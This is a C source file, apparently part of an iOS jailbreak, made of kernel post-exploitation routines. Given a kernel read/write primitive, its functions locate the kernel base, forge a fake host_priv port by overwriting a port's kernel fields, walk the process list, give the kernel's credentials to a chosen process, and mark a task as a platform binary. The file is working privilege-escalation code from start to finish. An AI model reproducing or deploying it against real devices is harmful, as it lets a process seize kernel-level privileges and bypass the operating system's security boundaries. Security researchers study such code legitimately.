#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include "debug.h"
#include "common.h"
#include "iokit.h"
#include "debug.h"
#include "KernelMemory.h"
#include "KernelStructureOffsets.h"
#include "KernelUtilities.h"
#include "find_port.h"

#define TF_PLATFORM 0x00000400 /* task is a platform binary */

uint64_t the_realhost;
uint64_t kernel_base;
offsets_t offs;
bool found_offsets = false;

uint64_t cached_task_self_addr = 0;
uint64_t task_self_addr()
{
    if (cached_task_self_addr == 0) {
        cached_task_self_addr = have_kmem_read() ? get_address_of_port(getpid(), mach_task_self()) : find_port_address(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
        DEBUG("task self: 0x%llx", cached_task_self_addr);
    }
    return cached_task_self_addr;
}

uint64_t ipc_space_kernel()
{
    return ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
}

uint64_t current_thread()
{
    uint64_t thread_port = have_kmem_read() ? get_address_of_port(getpid(), mach_thread_self()) : find_port_address(mach_thread_self(), MACH_MSG_TYPE_COPY_SEND);
    return ReadKernel64(thread_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
}

uint64_t find_kernel_base()
{
    uint64_t hostport_addr = have_kmem_read() ? get_address_of_port(getpid(), mach_host_self()) : find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
    uint64_t realhost = ReadKernel64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    the_realhost = realhost;
    
    uint64_t base = realhost & ~0xfffULL;
    // walk down to find the magic:
    for (int i = 0; i < 0x10000; i++) {
        if (ReadKernel32(base) == MACH_HEADER_MAGIC) {
            return base;
        }
        base -= 0x1000;
    }
    return 0;
}
mach_port_t fake_host_priv_port = MACH_PORT_NULL;

// build a fake host priv port
mach_port_t fake_host_priv()
{
    if (fake_host_priv_port != MACH_PORT_NULL) {
        return fake_host_priv_port;
    }
    // get the address of realhost:
    uint64_t hostport_addr = have_kmem_read() ? get_address_of_port(getpid(), mach_host_self()) : find_port_address(mach_host_self(), MACH_MSG_TYPE_COPY_SEND);
    uint64_t realhost = ReadKernel64(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    // allocate a port
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (err != KERN_SUCCESS) {
        DEBUG("failed to allocate port");
        return MACH_PORT_NULL;
    }
    
    // get a send right
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    
    // locate the port
    uint64_t port_addr = have_kmem_read() ? get_address_of_port(getpid(), port) : find_port_address(port, MACH_MSG_TYPE_COPY_SEND);
    
    // change the type of the port
#define IKOT_HOST_PRIV 4
#define IO_ACTIVE 0x80000000
    WriteKernel32(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), IO_ACTIVE | IKOT_HOST_PRIV);
    
    // change the space of the port
    WriteKernel64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER), ipc_space_kernel());
    
    // set the kobject
    WriteKernel64(port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), realhost);
    
    fake_host_priv_port = port;
    
    return port;
}

uint64_t get_proc_struct_for_pid(pid_t pid)
{
    uint64_t proc = ReadKernel64(ReadKernel64(GETOFFSET(kernel_task)) + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    DEBUG("proc = " ADDR, proc);
    if (proc == 0) {
        DEBUG("failed to get proc!");
        return 0;
    }
    if (pid == 0) {
        return proc;
    }
    while (proc) {
        if (ReadKernel32(proc + koffset(KSTRUCT_OFFSET_PROC_PID)) == pid)
            return proc;
        proc = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_P_LIST));
    }
    return 0;
}

uint64_t get_address_of_port(pid_t pid, mach_port_t port)
{
    
    uint64_t proc_struct_addr = get_proc_struct_for_pid(pid);
    DEBUG("get port address of port for pid : %d", pid);
    DEBUG("proc_struct_addr = " ADDR, proc_struct_addr);
    if (proc_struct_addr == 0) {
        DEBUG("failed to get proc_struct_addr!");
        return 0;
    }
    uint64_t task_addr = ReadKernel64(proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_TASK));
    DEBUG("task_addr = " ADDR, task_addr);
    if (task_addr == 0) {
        DEBUG("failed to get task_addr!");
        return 0;
    }
    uint64_t itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    DEBUG("itk_space = " ADDR, itk_space);
    if (itk_space == 0) {
        DEBUG("failed to get itk_space!");
        return 0;
    }
    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    DEBUG("is_table = " ADDR, is_table);
    if (is_table == 0) {
        DEBUG("failed to get is_table!");
        return 0;
    }
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    uint64_t port_addr = ReadKernel64(is_table + (port_index * sizeof_ipc_entry_t));
    DEBUG("port_addr = " ADDR, port_addr);
    if (port_addr == 0) {
        DEBUG("failed to get port_addr!");
        return 0;
    }
    return port_addr;
}

uint64_t get_kernel_cred_addr()
{
    uint64_t kernel_proc_struct_addr = get_proc_struct_for_pid(0);
    DEBUG("kernel_proc_struct_addr = " ADDR, kernel_proc_struct_addr);
    if (kernel_proc_struct_addr == 0) {
        DEBUG("failed to get kernel_proc_struct_addr!");
        return 0;
    }
    uint64_t kernel_ucred_struct_addr = ReadKernel64(kernel_proc_struct_addr + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    DEBUG("kernel_ucred_struct_addr = " ADDR, kernel_ucred_struct_addr);
    if (kernel_ucred_struct_addr == 0) {
        DEBUG("failed to get kernel_ucred_struct_addr!");
        return 0;
    }
    return kernel_ucred_struct_addr;
}

uint64_t give_creds_to_process_at_addr(uint64_t proc, uint64_t cred_addr)
{
    uint64_t orig_creds = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    DEBUG("orig_creds = " ADDR, orig_creds);
    if (orig_creds == 0) {
        DEBUG("failed to get orig_creds!");
        return 0;
    }
    WriteKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), cred_addr);
    return orig_creds;
}

void set_platform_binary(uint64_t proc)
{
    uint64_t task_struct_addr = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
    DEBUG("task_struct_addr = " ADDR, task_struct_addr);
    if (task_struct_addr == 0) {
        DEBUG("failed to get task_struct_addr!");
        return;
    }
    uint32_t task_t_flags = ReadKernel32(task_struct_addr + koffset(KSTRUCT_OFFSET_TASK_TFLAGS));
    task_t_flags |= TF_PLATFORM;
    WriteKernel32(task_struct_addr + koffset(KSTRUCT_OFFSET_TASK_TFLAGS), task_t_flags);
}
